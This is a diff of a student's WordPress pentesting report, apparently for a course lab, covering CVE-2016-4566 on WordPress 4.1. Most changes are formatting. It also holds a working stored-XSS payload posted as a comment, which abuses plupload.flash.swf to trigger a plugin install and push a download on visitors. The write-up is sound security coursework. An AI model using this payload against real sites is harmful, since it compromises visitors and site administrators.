@@ -1,6 +1,6 @@
 # Project 7 - WordPress Pentesting
 
-Time spent: 5+ hours spent in total
+> Time spent: 5+ hours spent in total
 
 > Objective: Find, analyze, recreate, and document **three to five vulnerabilities** affecting an old version of WordPress
 
@@ -8,6 +8,7 @@ Time spent: 5+ hours spent in total
 
 Created virtual environment in Docker.
   - [ ] GIF Walkthrough: 
+  
 		<img src="docker-wpVSkali.gif" alt="docker-wpVSkali Walkthrough">
 		
 ## Pentesting Report
@@ -18,19 +19,26 @@ Created virtual environment in Docker.
     - Tested in version: 4.1
     - Fixed in version: 4.1.11 
   - [ ] GIF Walkthrough: 
+  
 		<img src="SOMExss.gif" alt="CVE-2016-4566 Walkthrough">
+		
   - [ ] Steps to recreate: 
+  
 			As a logged in user, leaving a reply/comment to a post using the payload:
+			
 			```
-			<button onclick="fire()">Click</button>
-			<script>
-			function fire() {
-			open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
-			setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
-			}
-			</script>	
+				<button onclick="fire()">Click</button>
+				<script>
+				function fire() {
+				open('javascript:setTimeout("location=\'http://example.com/wp-includes/js/plupload/plupload.flash.swf?target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&\'", 2000)');
+				setTimeout('location="http://example.com/wp-admin/plugin-install.php?tab=plugin-information&plugin=wp-super-cache&TB_iframe=true&width=600&height=550"')
+				}
+				</script>	
 			```
+			
+			
 			After this comment posts sucessfully, any user that comes across the post will see a clickable button for the comment. If that user clicks the button, the XSS attack will execute and attempt to download a malicious payload from the attack. 
+			
 			
 			In the gif walkthrough, my browser extentions sucessfully blocks the attack from downloading the file, but a user without the proper safeguards would be prompted to download a file. 
 			
